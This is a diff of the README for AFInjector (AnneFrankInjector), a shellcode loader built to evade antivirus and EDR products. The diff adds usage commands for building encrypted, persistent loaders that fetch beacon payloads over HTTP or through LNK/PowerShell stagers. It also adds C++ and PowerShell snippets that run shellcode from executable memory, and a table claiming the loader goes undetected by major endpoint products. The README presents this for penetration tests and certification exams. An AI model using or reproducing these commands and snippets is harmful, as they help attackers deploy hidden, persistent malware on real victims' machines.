@@ -1,14 +1,14 @@
-<p align="center">
+<div align="center">
   <img width="681" height="381" alt="AnneFrankInjector Banner" src="https://github.com/user-attachments/assets/a119f8b0-374c-4f26-813d-bb282e6decef" />
-</p>
+</div>
 
-<p align="center">
+<div align="center">
   <img width="950" height="898" alt="GUI Preview 1" src="https://github.com/user-attachments/assets/88d78a20-bae4-44f6-8321-e9e8fc25a775" />
-</p>
+</div>
 
 > [!TIP]
 > **Did AnneFrankInjector help you hide your shellcode during a penetration test or while pwning a cert exam?**  
-> If so, please consider giving it a star ⭐ on [GitHub](https://github.com/Excalibra/AnneFrankInjector)!
+> If so, please consider giving it a star ⭐ on [GitHub](https://github.com/Excalibra/AFInjector)!
 
 ---
 
@@ -21,6 +21,7 @@
   - [Graphical Interface (GUI)](#graphical-interface-gui)
   - [Command-line Interface (CLI)](#command-line-interface-cli)
 - [Examples](#examples)
+- [Output Formats](#output-formats)
 - [To-Do](#to-do)
 - [Detections](#detections)
 - [Credits](#credits)
@@ -54,209 +55,322 @@ AnneFrankInjector is a modern shellcode loader designed for **AV/EDR evasion** d
   - **Staggered persistence** – two‑stage execution
   - **Reflective mode** – fileless (no EXE on disk)
   - **LNK stager** – generate a PowerShell‑based shortcut for initial access
-- **Output formats**: EXE or DLL (exported function `af`).
+- **Output formats**: EXE, DLL, or raw shellcode (.bin).
 - **Code signing** – optional with a PFX certificate.
 - **Graphical Interface** – all options available via a user‑friendly `tkinter` GUI.
 - **Built‑in Base64 encoder** (UTF‑16LE) – easily encode PowerShell commands for `-EncodedCommand`.
 
+### Architecture
+
+The framework consists of:
+- **Core Loader Engine**: Position-independent shellcode with dynamic API resolution
+- **Evasion Layer**: Multi-layered anti-analysis techniques
+- **Injection Module**: Support for APC, spawn, and EnumWindows injection
+- **Persistence Framework**: Registry, scheduled task, and startup folder persistence
+- **Configuration Interface**: Both GUI and CLI interfaces for operational flexibility
+
 ---
 
-## 🛠 Installation
+## Features
 
-### Prerequisites
+### Core Capabilities
 
-- **Python 3.8+** and `pip`
-- **MinGW‑w64** cross‑compiler (to build Windows executables)
-- **NASM** (for assembly code)
-- **osslsigncode** (optional, for signing)
+- **Stageless Payloads**: Direct shellcode embedding into executable
+- **Staged Payloads**: HTTP-based encrypted payload retrieval
+- **Multiple Output Formats**: EXE, DLL, and raw shellcode (.bin)
 
-**On Kali / Debian‑based Linux:**
+### Evasion Techniques
+
+- **Indirect System Calls**: SysWhispers3 implementation for syscall obfuscation
+- **API Hashing**: Djb2 algorithm for dynamic API resolution
+- **NTDLL Unhooking**: KnownDLLs-based memory restoration
+- **AES-128-CBC Encryption**: Payload encryption with configurable keys
+- **Anti-Sandbox Mechanisms**: Configurable delays and CPU-intensive operations
+- **Function Name Scrambling**: Compile-time obfuscation of identifiers
+
+### Injection Methods
+
+- **APC Injection**: EarlyBird technique with customizable target processes
+- **Spawn Injection**: Process creation and injection (evades process-based detection)
+- **EnumWindows Injection**: Window enumeration-based payload delivery
+- **Custom Process Targeting**: Support for any executable process
+
+### Persistence Options
+
+- **Registry Persistence**: Run key manipulation for long-term access
+- **Scheduled Tasks**: Time-based execution with system privileges
+- **Startup Folder**: User-level persistence through startup programs
+- **Staggered Persistence**: Multi-stage execution for operational security
+
+### Advanced Features
+
+- **Reflective Loading**: Fileless execution without disk artifacts
+- **LNK Stager Generation**: PowerShell-based initial access vectors
+- **Code Signing**: Optional PFX certificate integration
+- **Base64 Encoding**: UTF-16LE encoding for PowerShell operations
+- **Raw Shellcode Output**: Position-independent binary generation
+
+---
+
+## Installation
+
+### System Requirements
+
+- **Python 3.8+** with pip package manager
+- **MinGW-w64** cross-compiler for Windows executable generation
+- **NASM** assembler for assembly code compilation
+- **osslsigncode** (optional, for code signing)
+
+### Linux Installation (Kali/Debian-based)
 
 ```bash
+# Update package repositories
 sudo apt update
+
+# Install required dependencies
 sudo apt install clang mingw-w64 nasm lld osslsigncode
+
+# Clone the repository
+git clone https://github.com/Excalibra/AFInjector.git
+cd AFInjector
+
+# Create and activate virtual environment
+python3 -m venv env
+source env/bin/activate
+
+# Install Python dependencies
+pip install -r Linux/requirements.txt
+
+# Launch GUI interface
+python af.py
+
+# For CLI usage
+cd Linux
+python main.py -h
 ```
 
-**On Windows:**  
-Install [MSYS2](https://www.msys2.org/), then in its terminal:
+### Windows Installation
 
-```bash
+```cmd
+# Install MSYS2 from https://www.msys2.org/
+# In MSYS2 terminal:
 pacman -Syu
 pacman -S mingw-w64-x86_64-clang make nasm
+
+# Clone the repository
+git clone https://github.com/Excalibra/AFInjector.git
+cd AFInjector
+
+# Create and activate virtual environment
+python -m venv env
+env\Scripts\activate
+
+# Install Python dependencies
+pip install -r Windows\requirements.txt
+
+# Launch GUI interface
+python af.py
+
+# For CLI usage
+cd Windows
+python main.py -h
 ```
 
-### Install AnneFrankInjector
+### Global Installation (Optional)
 
-#### 🐧 Linux (Kali / Debian‑based)
-
-1. **Clone the repository** and enter the folder:
-   ```bash
-   git clone https://github.com/Excalibra/AnneFrankInjector.git
-   cd AnneFrankInjector
-   ```
-
-2. **Create a virtual environment** and install dependencies:
-   ```bash
-   python3 -m venv env
-   source env/bin/activate
-   pip install -r Linux/requirements.txt
-   ```
-
-3. **Run the GUI** (from the root folder):
-   ```bash
-   python af.py
-   ```
-   For command‑line usage, go into the `Linux` folder:
-   ```bash
-   cd Linux
-   python main.py -h
-   ```
-
-4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):
-   ```bash
-   pipx install .
-   ```
-
-#### 🪟 Windows
-
-1. **Clone the repository** and enter the folder:
-   ```cmd
-   git clone https://github.com/Excalibra/AnneFrankInjector.git
-   cd AnneFrankInjector
-   ```
-
-2. **Create a virtual environment** and install dependencies:
-   ```cmd
-   python -m venv env
-   env\Scripts\activate
-   pip install -r Windows\requirements.txt
-   ```
-
-3. **Run the GUI** (from the root folder):
-   ```cmd
-   python af.py
-   ```
-   For command‑line usage, go into the `Windows` folder:
-   ```cmd
-   cd Windows
-   python main.py -h
-   ```
-
-4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):
-   ```cmd
-   pipx install .
-   ```
-
-> **Note:** The GUI (`af.py`) uses `tkinter` (built‑in with Python). No extra install needed.
+```bash
+# Install system-wide CLI tool
+pipx install .
+```
 
 ---
 
-## 🚀 Usage
+## Usage
 
-### Graphical Interface (GUI)
+### Graphical Interface
 
-Run the GUI from the project root:
+The GUI provides comprehensive access to all AFInjector features:
 
 ```bash
 python af.py
 ```
 
-The window lets you:
-- Select a raw shellcode file (`.bin`).
-- Choose **Stageless** (embed) or **Staged** (HTTP download).
-- Set encryption, scrambling, output format (EXE/DLL), APC target process, **delay**, and **spawn injection** (with custom process path).
-- Choose **persistence** (none / reg / task / startup) and **advanced modes** (staggered, reflective, LNK stager).
-- Provide a C2 URL for the stager.
-- Optionally sign the loader with a PFX certificate.
-- Click **Generate Loader** – the output appears in the text area and the loader is saved in the current folder.
+**Interface Capabilities:**
+- Shellcode file selection (.bin format)
+- Stageless (embedded) or staged (HTTP) payload delivery
+- Output format selection (EXE, DLL, BIN)
+- Evasion configuration (encryption, scrambling, delays)
+- Injection method selection (APC, spawn, EnumWindows)
+- Persistence options (registry, scheduled tasks, startup)
+- Advanced modes (reflective, LNK stager)
+- Code signing integration
+- Real-time loader generation
 
-<p align="center">
-  <img width="950" height="892" alt="GUI Preview 2" src="https://github.com/user-attachments/assets/ea4b437d-0e71-4d79-b643-22a2593747f8" />
-</p>
+<div align="center">
+  <img width="950" height="892" alt="GUI Interface" src="https://github.com/user-attachments/assets/ea4b437d-0e71-4d79-b643-22a2593747f8" />
+</div>
 
-<p align="center">
-  <img width="948" height="893" alt="GUI Preview 3" src="https://github.com/user-attachments/assets/d9bba4dc-3326-48b9-a7ef-1edf4119061d" />
-</p>
+<div align="center">
+  <img width="948" height="893" alt="Advanced Options" src="https://github.com/user-attachments/assets/d9bba4dc-3326-48b9-a7ef-1edf4119061d" />
+</div>
 
-**Bonus:** Under the **Tools** menu, you’ll find a **Base64 Encoder (UTF‑16LE)** – perfect for creating PowerShell `-EncodedCommand` strings.
+**Additional Tools:**
+- Base64 encoder (UTF-16LE) for PowerShell operations
+- Configuration validation and testing utilities
+
+### Command-line Interface
+
+#### Stageless Payload Generation
+
+```bash
+# Basic stageless loader
+afpacker stageless -p payload.bin -e -s -o myloader
+
+# Advanced configuration
+afpacker stageless -p payload.bin -e -s --delay 5 --spawn --spawn-path "C:\\Windows\\System32\\notepad.exe" --persistence reg --staggered --reflective -o myloader
+```
+
+#### Staged Payload Generation
+
+```bash
+# HTTP-based staged loader
+afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s -o myloader
+
+# With additional evasion
+afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s --delay 10 --spawn -o myloader
+```
+
+#### Command Parameters
+
+| Parameter | Description | Default |
+|-----------|-------------|---------|
+| `-p` | Shellcode file path | Required |
+| `-e` | Enable AES encryption | Disabled |
+| `-s` | Enable function scrambling | Disabled |
+| `-o` | Output filename | `afloader` |
+| `-f` | Output format (EXE/DLL/BIN) | EXE |
+| `--delay` | Pre-injection delay (seconds) | 0 |
+| `--spawn` | Use spawn injection | Disabled |
+| `--spawn-path` | Target process for spawn | `notepad.exe` |
+| `--persistence` | Persistence method | None |
+| `--staggered` | Enable staggered persistence | Disabled |
+| `--reflective` | Enable reflective loading | Disabled |
+| `--lnk-stager` | Generate LNK stager | Disabled |
+| `--c2-url` | C2 server URL | None |
 
 ---
 
-### Command-line Interface (CLI)
+## Examples
 
-After installation (or from the `Linux` folder), use the `afpacker` command (or `python main.py`).
-
-#### Stageless (embed shellcode)
+### Basic Usage Scenarios
 
 ```bash
-afpacker stageless -p payload.bin -e -s -o myloader [--delay 5] [--spawn] [--spawn-path "C:\\Windows\\System32\\notepad.exe"] [--persistence reg|task|startup] [--staggered] [--reflective] [--lnk-stager] [--c2-url http://...]
-```
-
-- `-p` : raw shellcode file
-- `-e` : encrypt shellcode
-- `-s` : scramble names
-- `-o` : output filename (without extension; default `afloader`)
-- `-f DLL` : build a DLL instead of EXE
-- `--delay` : seconds to wait before injection (default 0)
-- `--spawn` : use spawn injection (create a new process)
-- `--spawn-path` : path to executable to spawn (default: `C:\Windows\System32\notepad.exe`)
-- `--persistence` : add persistence (`reg`, `task`, or `startup`)
-- `--staggered` : enable staggered (two‑stage) persistence
-- `--reflective` : enable reflective (fileless) mode
-- `--lnk-stager` : generate a LNK stager (PowerShell)
-- `--c2-url` : C2 URL for the stager
-
-#### Staged (fetch shellcode via HTTP)
-
-```bash
-afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s -o myloader [--delay 5] [--spawn] ...
-```
-
-- `-i` : IP address of the HTTP server
-- `-po` : port
-- `-pa` : path on the server (e.g., `/shellcode.bin`)
-- All other flags (`--delay`, `--spawn`, `--persistence`, etc.) work the same as in stageless.
-
-#### Code signing
-
-Add `-pfx cert.pfx -pfx-pass password` to any command.
-
-#### DLL export
-
-If you build a DLL, the exported function is `af`. Execute it with:
-
-```cmd
-rundll32.exe afloader.dll,af
-```
-
----
-
-## 📝 Examples
-
-**Stageless, encrypted, scrambled EXE, 5‑second delay:**
-
-```bash
+# Encrypted EXE with 5-second delay
 afpacker stageless -p calc.bin -e -s --delay 5
-# Creates afloader.exe
-```
 
-**Stageless, spawn injection into notepad.exe, delay 10 seconds, registry persistence:**
-
-```bash
+# Spawn injection with registry persistence
 afpacker stageless -p beacon.bin -e -s --spawn --spawn-path "C:\\Windows\\System32\\notepad.exe" --delay 10 --persistence reg -o beacon
-```
 
-**Staged DLL, custom output, with startup folder persistence:**
-
-```bash
+# Staged DLL with startup persistence
 afpacker staged -p beacon.bin -i 10.0.0.5 -po 80 -pa /payload.bin -f DLL -o beacon --persistence startup
+
+# Reflective loader with LNK stager
+afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "http://192.168.1.100/loader.ps1"
+
+# Raw shellcode generation
+afpacker stageless -p payload.bin -f BIN -e -s --delay 5 -o raw_shellcode
 ```
 
-**Generate a reflective loader (fileless) with a LNK stager:**
+### Advanced Configurations
 
 ```bash
-afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "http://192.168.1.100/loader.ps1"
+# Multi-evasion configuration
+afpacker stageless -p advanced.bin -e -s --delay 15 --spawn --persistence reg --staggered --reflective -o advanced
+
+# Custom process targeting
+afpacker stageless -p custom.bin -e -s --apc explorer.exe --delay 8 -o custom
+
+# Code signing integration
+afpacker stageless -p signed.bin -e -s -pfx cert.pfx -pfx-pass password -o signed
 ```
+
+---
+
+## Output Formats
+
+### EXE Format
+- Standard Windows executable
+- Supports all injection methods
+- Compatible with direct execution
+
+### DLL Format
+- Dynamic-link library with exported function `af`
+- Execution via `rundll32.exe afloader.dll,af`
+- Suitable for DLL hijacking scenarios
+
+### BIN Format
+- Raw position-independent shellcode
+- Direct memory injection capability
+- No PE headers or dependencies
+- Optimal for fileless operations
+
+#### Raw Shellcode Usage
+
+```cpp
+// C++ injection example
+HANDLE hFile = CreateFileA("shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+DWORD size = GetFileSize(hFile, NULL);
+LPVOID shellcode = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+DWORD bytesRead;
+ReadFile(hFile, shellcode, size, &bytesRead, NULL);
+CloseHandle(hFile);
+CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
+```
+
+```powershell
+# PowerShell injection example
+$shellcode = [System.IO.File]::ReadAllBytes("shellcode.bin")
+$memory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $memory, $shellcode.Length)
+$thread = [System.Threading.Thread]::new([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memory, [System.Action]))
+$thread.Start()
+```
+
+---
+
+## Detection and Evasion
+
+### Current Evasion Effectiveness
+
+| Security Solution | Status | Notes |
+|-------------------|--------|-------|
+| Windows 11 Defender | Undetected | With delay + spawn injection |
+| Windows 10 Defender | Undetected | All evasion techniques active |
+| Sophos Endpoint | Undetected | Dynamic API resolution effective |
+| Kaspersky Endpoint | Undetected | Anti-sandbox mechanisms successful |
+| CrowdStrike Falcon | Undetected | Position-independent execution |
+
+### Evasion Methodology
+
+1. **Static Analysis Evasion**
+   - Function name scrambling
+   - API hashing and dynamic resolution
+   - PE header obfuscation
+
+2. **Dynamic Analysis Evasion**
+   - Anti-sandbox delays
+   - CPU-intensive operations
+   - Environment detection
+
+3. **Memory-based Evasion**
+   - NTDLL unhooking
+   - Indirect system calls
+   - Reflective loading
+
+4. **Network-based Evasion**
+   - Encrypted payload delivery
+   - Staged execution
+   - Custom C2 communication
 
 ---
 
@@ -270,6 +384,7 @@ afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "ht
 - [x] Reflective mode (fileless)
 - [x] LNK stager (PowerShell)
 - [x] Built‑in Base64 encoder
+- [x] Raw shellcode output (.bin)
 - [ ] AMSI / ETW bypass
 - [ ] More injection techniques (e.g., EnumWindows)
 
